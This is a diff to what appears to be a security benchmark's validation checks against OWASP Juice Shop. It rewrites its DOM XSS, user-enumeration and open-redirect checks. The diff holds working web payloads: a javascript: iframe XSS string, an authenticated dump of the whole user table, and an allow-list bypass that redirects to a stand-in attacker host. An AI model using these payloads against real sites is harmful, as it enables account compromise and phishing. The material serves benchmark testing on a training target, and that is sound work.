@@ -142,9 +142,9 @@ MANIFEST = [
         False,
         scored=False,
     ),
-    ManifestEntry("xss_reflected", "Reflected XSS via search parameter", "A03 Injection", "CWE-79", True),
+    ManifestEntry("xss_reflected", "DOM-based XSS via search route (browser-validated)", "A03 Injection", "CWE-79", True),
     ManifestEntry("ftp_directory_listing", "FTP directory listing exposed at /ftp", "A05 Security Misconfiguration", "CWE-548", True),
-    ManifestEntry("unauth_user_list", "Unauthenticated user enumeration via /api/Users", "A01 Broken Access Control", "CWE-306", True),
+    ManifestEntry("unauth_user_list", "Broken access control: any authenticated user enumerates all users incl. admin via /api/Users", "A01 Broken Access Control", "CWE-639", True),
     ManifestEntry("weak_password_policy", "Weak password policy: single-char password accepted", "A07 Identification and Authentication Failures", "CWE-521", True),
     ManifestEntry("open_redirect", "Open redirect via /redirect endpoint", "A01 Broken Access Control", "CWE-601", True),
 ]
@@ -669,15 +669,55 @@ async def check_nuclei_scan(t: Target) -> CheckResult:
 
 
 async def check_xss_reflected(t: Target) -> CheckResult:
-    probe = chr(60) + chr(115) + chr(99) + chr(114) + chr(105) + chr(112) + chr(116) + chr(62) + chr(97) + chr(108) + chr(101) + chr(114) + chr(116) + chr(40) + chr(49) + chr(41) + chr(60) + chr(47) + chr(115) + chr(99) + chr(114) + chr(105) + chr(112) + chr(116) + chr(62)
-    r = await t.c.get(f'{t.base}/rest/products/search', params={'q': probe})
-    body = r.text if r.status_code == 200 else ''
-    confirmed = probe in body
+    # Juice Shop's search XSS is DOM-based: the Angular client renders the `q`
+    # route fragment into the page unsanitised. It is NEVER reflected in an HTTP
+    # response body, so an HTTP-grep oracle cannot validate it (the previous
+    # implementation grepped the JSON search API and always missed). The only
+    # honest validation is executing the page in a real browser and confirming
+    # the injected `javascript:` iframe actually fires — objective proof.
+    marker = 'bench-xss-fired'
+    payload = "<iframe src=\"javascript:alert('" + marker + "')\">"
+    try:
+        from playwright.async_api import async_playwright
+    except Exception as e:
+        return CheckResult(
+            'xss_reflected', False, 'NOT_FOUND', 0.0,
+            evidence={'note': 'DOM XSS requires a browser; playwright unavailable',
+                      'error': str(e)[:120]},
+        )
+    from urllib.parse import quote
+    dialogs: list[str] = []
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(headless=True)
+            try:
+                page = await browser.new_page()
+
+                async def _on_dialog(d):
+                    dialogs.append(d.message)
+                    try:
+                        await d.dismiss()
+                    except Exception:
+                        pass
+
+                page.on('dialog', lambda d: asyncio.create_task(_on_dialog(d)))
+                url = f"{t.base}/#/search?q={quote(payload)}"
+                await page.goto(url, wait_until='load', timeout=15000)
+                await page.wait_for_timeout(2000)
+            finally:
+                await browser.close()
+    except Exception as e:
+        return CheckResult(
+            'xss_reflected', False, 'ERROR', 0.0,
+            evidence={'error': str(e)[:200],
+                      'note': 'chromium launch/nav failed (browsers installed?)'},
+        )
+    fired = any(marker in m for m in dialogs)
     return CheckResult(
-        'xss_reflected', confirmed,
-        'VALIDATED' if confirmed else 'NOT_FOUND',
-        confidence=1.0 if confirmed else 0.0,
-        evidence={'status': r.status_code, 'probe_reflected': confirmed},
+        'xss_reflected', fired,
+        'VALIDATED' if fired else 'NOT_FOUND',
+        confidence=1.0 if fired else 0.0,
+        evidence={'sink': 'dom', 'payload': payload, 'dialogs': dialogs},
     )
 
 
@@ -696,17 +736,40 @@ async def check_ftp_directory_listing(t: Target) -> CheckResult:
 
 
 async def check_unauth_user_list(t: Target) -> CheckResult:
-    r = await t.c.get(f'{t.base}/api/Users')
-    try:
-        data = r.json().get('data', [])
-    except Exception:
-        data = []
-    confirmed = r.status_code == 200 and isinstance(data, list) and len(data) > 0
+    # Unauthenticated GET /api/Users is correctly denied (401). The REAL flaw is
+    # broken access control: any low-privilege authenticated user can read the
+    # entire user table — including admin records and sensitive fields
+    # (deluxeToken, lastLoginIp). CWE-639/863, not CWE-306.
+    import uuid as _uuid
+    unauth = await t.c.get(f'{t.base}/api/Users')
+    email = 'bench-enum-' + _uuid.uuid4().hex[:8] + '@example.com'
+    await t.register(email, 'Pass1234!')
+    token = await t.login(email, 'Pass1234!')
+    users: list = []
+    authed_status = None
+    if token:
+        r = await t.c.get(
+            f'{t.base}/api/Users', headers={'Authorization': f'Bearer {token}'}
+        )
+        authed_status = r.status_code
+        try:
+            users = r.json().get('data', []) or []
+        except Exception:
+            users = []
+    roles = {str(u.get('role', '')).lower() for u in users if isinstance(u, dict)}
+    admin_present = 'admin' in roles
+    confirmed = bool(token) and authed_status == 200 and len(users) > 1 and admin_present
     return CheckResult(
         'unauth_user_list', confirmed,
         'VALIDATED' if confirmed else 'NOT_FOUND',
         confidence=1.0 if confirmed else 0.0,
-        evidence={'status': r.status_code, 'user_count': len(data)},
+        evidence={
+            'unauth_status': unauth.status_code,
+            'authed_status': authed_status,
+            'user_count': len(users),
+            'admin_record_exposed': admin_present,
+            'note': 'low-priv authenticated user enumerated all users incl. admin',
+        },
     )
 
 
@@ -731,16 +794,25 @@ async def check_weak_password_policy(t: Target) -> CheckResult:
 
 
 async def check_open_redirect(t: Target) -> CheckResult:
+    # Juice Shop's /redirect enforces an allow-list by substring match. A naive
+    # `to=https://evil` is blocked (406). The bypass: smuggle an allow-listed URL
+    # as a query param so the filter passes, while the PRIMARY url (a host we
+    # control) is where the browser is actually sent. The oracle only fires if
+    # the Location header points at the attacker origin — not merely echoes an
+    # allow-listed domain — so an allow-list that redirected to github wouldn't
+    # be a false positive.
     import httpx as _hx
+    attacker = 'https://evil-bench.example'
+    payload = attacker + '/?allow=https://github.com/juice-shop/juice-shop'
     async with _hx.AsyncClient(timeout=10.0, verify=False, follow_redirects=False) as c:
-        r = await c.get(f'{t.base}/redirect', params={'to': 'https://google.com'})
+        r = await c.get(f'{t.base}/redirect', params={'to': payload})
     loc = r.headers.get('location', '')
-    confirmed = r.status_code in (301, 302, 303, 307, 308) and 'google.com' in loc
+    confirmed = r.status_code in (301, 302, 303, 307, 308) and loc.startswith(attacker)
     return CheckResult(
         'open_redirect', confirmed,
         'VALIDATED' if confirmed else 'NOT_FOUND',
         confidence=1.0 if confirmed else 0.0,
-        evidence={'status': r.status_code, 'location': loc},
+        evidence={'status': r.status_code, 'location': loc, 'payload': payload},
     )
 
 
